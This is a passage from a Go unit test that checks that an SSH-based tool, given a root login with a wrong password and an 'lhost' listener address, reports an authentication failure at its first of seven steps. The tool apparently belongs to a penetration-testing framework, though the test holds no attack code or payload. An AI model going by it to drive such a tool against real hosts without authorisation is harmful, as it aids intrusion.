		return 0, "OK\n", ""
	})
	_ = srv
	_ = srv
	res, err := tool.Run(context.Background(), map[string]any{
		"ssh_host": host, "ssh_port": float64(port), "ssh_user": "root", "ssh_pass": "wrong",
		"lhost": host, "wait_time": 5,
	}, &core.ToolContext{Workdir: filepath.Join(t.TempDir(), "work", "job1")})
	if err != nil {
		t.Fatalf("run: %v", err)
	}
	if res.Status != core.StatusError {
		t.Fatalf("status = %s", res.Status)
	}
	if !strings.HasPrefix(res.Stderr, "RuntimeError: SSH 连接/认证失败: ") {
		t.Errorf("stderr = %q", res.Stderr)
	}
	if !strings.Contains(res.Stdout, "[1/7] SSH 连接") || strings.Contains(res.Stdout, "连接成功") {
		t.Errorf("stdout = %q", res.Stdout)
	}
}
